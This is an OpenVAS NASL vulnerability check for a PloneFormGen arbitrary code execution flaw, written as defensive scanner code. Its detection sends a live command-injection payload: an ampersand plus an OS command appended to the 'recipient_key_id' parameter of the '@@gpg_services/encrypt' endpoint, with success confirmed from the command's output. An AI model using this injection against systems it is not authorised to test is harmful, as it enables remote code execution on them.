###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plone_60247.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# PloneFormGen Arbitrary Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:plone:plone";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103736");
  script_bugtraq_id(60247);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

  script_name("PloneFormGen Arbitrary Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60247");
  script_xref(name:"URL", value:"http://plone.org/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-12 11:35:33 +0200 (Wed, 12 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_plone_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("plone/installed");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"PloneFormGen is prone to an arbitrary code-execution vulnerability.

An attacker can leverage this issue to execute arbitrary code within
the context of the application.

PloneFormGen 1.7.4 through 1.7.8 are vulnerable, other versions may
also be affected.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

cmds = exploit_commands();

foreach cmd (keys(cmds)) {

  url = dir + '/@@gpg_services/encrypt?data=&recipient_key_id=%26' + cmds[cmd];

  if(http_vuln_check(port:port, url:url, pattern:cmd)) {

    security_message(port:port);
    exit(0);

  }

}

exit(99);

